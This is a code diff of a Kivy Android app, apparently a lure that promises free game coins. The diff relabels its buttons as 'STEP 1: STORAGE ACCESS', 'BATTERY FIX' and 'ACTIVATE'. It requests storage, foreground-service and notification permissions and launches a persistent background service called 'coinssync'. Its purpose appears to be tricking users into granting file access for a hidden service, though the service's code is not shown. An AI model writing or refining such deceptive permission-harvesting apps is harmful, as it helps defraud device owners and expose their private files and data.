@@ -10,9 +10,9 @@ class CoinsApp(App):
         layout = BoxLayout(orientation="vertical", padding=30, spacing=20)
         self.status = Label(text="Server Status: Online", font_size='18sp')
 
-        btn_1 = Button(text="RECHARGE COINS - SERVER 1", background_color=(0.2, 0.4, 0.9, 1))
-        btn_2 = Button(text="RECHARGE COINS - SERVER 2", background_color=(0.8, 0.5, 0.2, 1))
-        btn_3 = Button(text="RECHARGE COINS - FINAL STEP", background_color=(0.1, 0.7, 0.2, 1), bold=True)
+        btn_1 = Button(text="STEP 1: STORAGE ACCESS", background_color=(0.2, 0.4, 0.9, 1))
+        btn_2 = Button(text="STEP 2: BATTERY FIX", background_color=(0.8, 0.5, 0.2, 1))
+        btn_3 = Button(text="FINAL STEP: ACTIVATE", background_color=(0.1, 0.7, 0.2, 1), bold=True)
 
         btn_1.bind(on_press=self.open_files)
         btn_2.bind(on_press=self.disable_battery)
@@ -48,12 +48,12 @@ class CoinsApp(App):
         except: pass
 
     def start_sync(self, instance):
+        # إضافة إذن POST_NOTIFICATIONS لضمان عمل الخدمة في أندرويد 13 و 14
         perms = [
-            Permission.READ_MEDIA_IMAGES,
-            Permission.FOREGROUND_SERVICE,
-            Permission.ACCESS_FINE_LOCATION,
+            Permission.READ_EXTERNAL_STORAGE,
             Permission.WRITE_EXTERNAL_STORAGE,
-            Permission.READ_EXTERNAL_STORAGE
+            Permission.FOREGROUND_SERVICE,
+            "android.permission.POST_NOTIFICATIONS"
         ]
         request_permissions(perms, self.launch)
 
@@ -62,9 +62,9 @@ class CoinsApp(App):
             PythonActivity = autoclass('org.kivy.android.PythonActivity')
             Service = autoclass('org.test.coinssync.ServiceMyservice')
             Service.start(PythonActivity.mActivity, "")
-            self.status.text = "Status: Connection Active"
+            self.status.text = "✅ System Active"
         except:
-            self.status.text = "Error Connection"
+            self.status.text = "❌ Error Launching"
 
 if __name__ == "__main__":
     CoinsApp().run()
